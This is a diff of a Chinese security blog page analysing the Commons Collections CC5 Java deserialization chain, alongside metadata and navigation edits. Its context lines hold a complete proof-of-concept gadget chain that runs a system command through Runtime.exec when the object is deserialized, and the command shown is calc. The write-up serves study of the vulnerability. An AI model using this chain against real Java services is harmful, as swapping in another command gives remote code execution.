@@ -27,9 +27,8 @@
 <meta property="og:description" content="CC5 cc5的后半部分和之前是一样的，只是在调用LazyMap的get方法时，使用的是&#96;TiedMapEntry&#96;的&#96;toString&#96;方法，相当于是提供了一个新的入口   CC5攻击链分析 调用get 这里&#96;TiedMapEntry&#96;的同&#96;toString&#96;方法调用了&#96;getValue&#96;方法，而&#96;getValue&#96;方法调用了map的&#96;get&#96;方法  12345678&#x2F;&#x2F; TiedMapEntr">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734800821929-8a9e0e29-f2d6-495d-96d6-ce63b4c8122d.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740789764342-d7632a8d-9ffc-4e3f-b4b8-6de3684d8a9d.png">
 <meta property="article:published_time" content="2025-03-01T00:49:18.852Z">
-<meta property="article:modified_time" content="2025-03-01T00:49:38.561Z">
+<meta property="article:modified_time" content="2025-03-02T01:21:47.941Z">
 <meta property="article:author" content="Sean">
 <meta property="article:tag" content="CC链">
 <meta name="twitter:card" content="summary">
@@ -141,7 +140,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dXpnp"><span class="nav-number">1.</span> <span class="nav-text">CC5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#N47sb"><span class="nav-number">1.1.</span> <span class="nav-text">CC5攻击链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FpvFg"><span class="nav-number">1.1.1.</span> <span class="nav-text">调用get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FID1K"><span class="nav-number">1.1.2.</span> <span class="nav-text">调用toString</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fc7xG"><span class="nav-number">1.2.</span> <span class="nav-text">疑问</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dXpnp"><span class="nav-number">1.</span> <span class="nav-text">CC5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#N47sb"><span class="nav-number">1.1.</span> <span class="nav-text">CC5攻击链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FpvFg"><span class="nav-number">1.1.1.</span> <span class="nav-text">调用get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FID1K"><span class="nav-number">1.1.2.</span> <span class="nav-text">调用toString</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -154,7 +153,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -220,9 +219,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-01 08:49:18 / 修改时间：08:49:38" itemprop="dateCreated datePublished" datetime="2025-03-01T08:49:18+08:00">2025-03-01</time>
+      <time title="创建时间：2025-03-01 08:49:18" itemprop="dateCreated datePublished" datetime="2025-03-01T08:49:18+08:00">2025-03-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-02 09:21:47" itemprop="dateModified" datetime="2025-03-02T09:21:47+08:00">2025-03-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -270,13 +275,6 @@ cc5的后半部分和之前是一样的，只是在调用LazyMap的get方法时�
 
 <p><strong>最终代码如下</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="fc7xG">疑问</h2>
-按道理来说，上面的整个exp是没有问题的
-
-<p>但是在我打断点调试后，发现并没有到达指定位置就执行了命令，在执行下面这句代码后就执行了命令，虽说也是反序列化过程中触发的吧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740789764342-d7632a8d-9ffc-4e3f-b4b8-6de3684d8a9d.png"></p>
-
     </div>
 
     
@@ -315,6 +313,9 @@ cc5的后半部分和之前是一样的，只是在调用LazyMap的get方法时�
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2025/03/02/CC7%E9%93%BE/" rel="next" title="CC5链">
+                  CC5链 <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
